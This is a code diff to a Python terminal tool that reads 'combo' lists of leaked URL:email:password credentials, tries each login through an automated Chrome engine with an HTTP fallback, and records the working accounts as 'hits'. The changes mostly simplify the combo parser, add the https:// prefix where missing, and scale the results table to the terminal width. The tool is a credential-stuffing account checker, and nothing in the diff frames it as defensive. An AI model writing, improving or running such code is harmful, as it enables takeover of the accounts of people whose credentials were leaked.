@@ -752,45 +752,88 @@ def main():
         
         choice = input(f"\n  {W}> {RES}").strip()
         
-        if choice=='1':
-            # (existing checker code, unchanged)
-            if not combo_file:
+                if choice == '1':
+            # 1. NODE VALIDATION & SOURCE INTERROGATION
+            if not combo_file or not os.path.exists(combo_file):
                 print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
+            
+            spin("PARSING RAW COMBO DATA", 1.5)
             combos = []
-            with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
+            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                 for line in f:
-                    line=line.strip()
+                    line = line.strip()
                     if not line or line.startswith('#'): continue
-                    if '|' in line:
-                        parts=line.split('|')
-                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),'|'.join(parts[2:]).strip()))
-                    elif '://' in line:
-                        proto,rest=line.split('://',1)
-                        if ':' in rest:
-                            domain,creds=rest.split(':',1)
-                            e,p=creds.split(':',1) if ':' in creds else (creds,'')
-                            combos.append((proto+'://'+domain,e.strip(),p.strip()))
-                    else:
-                        parts=line.split(':')
-                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),':'.join(parts[2:]).strip()))
+                    
+                    # Target Parser Logic: url:email:pass
+                    parts = line.split(':')
+                    if len(parts) >= 3:
+                        u_node = parts[0].strip()
+                        e_node = parts[1].strip()
+                        p_node = ':'.join(parts[2:]).strip()
+                        
+                        # Auto-Correction for Chrome Node Navigation
+                        if not u_node.startswith('http'):
+                            u_node = 'https://' + u_node
+                            
+                        combos.append((u_node, e_node, p_node))
+
             if not combos:
-                print(f"  {R}No combos.{RES}"); time.sleep(1); continue
-            results=[]; total=len(combos); done=0; active=0; lock=threading.Lock()
-            print(f"\n  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}")
-            print(f"  {DIM}{'─'*90}{RES}")
-            def worker(url,email,pw):
-                nonlocal done,active
-                r = chrome.login(url,email,pw)
-                if not r['active'] and 'Err' in r.get('info',''): r = http_login(url,email,pw)
+                print(f"  {R}No valid URL:EMAIL:PASS nodes detected.{RES}"); time.sleep(1); continue
+
+            # 2. DYNAMIC SCREEN SCALING LOGIC
+            # Automatically calculates Termux width to prevent line-breaks
+            import shutil
+            cols, _ = shutil.get_terminal_size(fallback=(80, 24))
+            
+            # Proportional Column Width Calculation
+            w_st = 9  # Fixed width for Status
+            w_pa = int(cols * 0.15)
+            w_us = int(cols * 0.25)
+            w_li = cols - (w_st + w_pa + w_us + 12) # Remaining space for URL
+
+            # 3. INITIALIZE EXTRACTION MESH
+            results = []; total = len(combos); done = 0; active = 0; lock = threading.Lock()
+            os.system('clear'); banner()
+            
+            # --- AUTO-RESIZED SNIPPET HEADER ---
+            print(f"  {Y}{'LINK':<{w_li}} {'|'} {'USER/EMAIL':<{w_us}} {'|'} {'PASS':<{w_pa}} {'|'} {'STATUS'}{RES}")
+            print(f"  {DIM}{'─' * (cols - 4)}{RES}")
+
+            def worker(url, email, pw):
+                nonlocal done, active
+                # Primary Execution: RealChrome CDP Engine
+                r = chrome.login(url, email, pw)
+                
+                # Failover Execution: HTTP Signal Recovery
+                if not r['active'] and 'Err' in r.get('info', ''):
+                    r = http_login(url, email, pw)
+                
                 with lock:
-                    results.append(r); done+=1
-                    if r['active']: active+=1
+                    results.append(r); done += 1
+                    if r['active']: active += 1
+                    
+                    # Status Formatting
                     st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
-                    print(f"  {W}{r['link'][:33]:<35}{DIM} | {RES}{W}{r['email'][:26]:<28}{DIM} | {RES}{W}{r['pass'][:18]:<20}{DIM} | {RES}{st}")
+                    
+                    # Dynamic Row Truncation (Prevents UI ghosting/wrapping)
+                    l_txt = url[:w_li-3] + ".." if len(url) > w_li else url
+                    u_txt = email[:w_us-3] + ".." if len(email) > w_us else email
+                    p_txt = pw[:w_pa-3] + ".." if len(pw) > w_pa else pw
+                    
+                    # Output Row
+                    print(f"  {W}{l_txt:<{w_li}}{DIM} | {RES}{W}{u_txt:<{w_us}}{DIM} | {RES}{W}{p_txt:<{w_pa}}{DIM} | {RES}{st}")
+
+            # 4. EXECUTION DISPATCHER (ThreadPool Optimized for Termux)
             with ThreadPoolExecutor(max_workers=3) as ex:
-                for url,email,pw in combos: ex.submit(worker,url,email,pw)
-            print(f"\n  {G}{active}/{total} active.{RES}")
-            hits.extend([r for r in results if r['active']]); wait_enter()
+                for url, email, pw in combos: 
+                    ex.submit(worker, url, email, pw)
+
+            # 5. FINAL SESSION WRAP-UP
+            print(f"  {DIM}{'─' * (cols - 4)}{RES}")
+            print(f"  {G}{active}/{total} active.{RES}")
+            
+            hits.extend([r for r in results if r['active']])
+            wait_enter()
             
         elif choice == '2':
             os.system('clear')
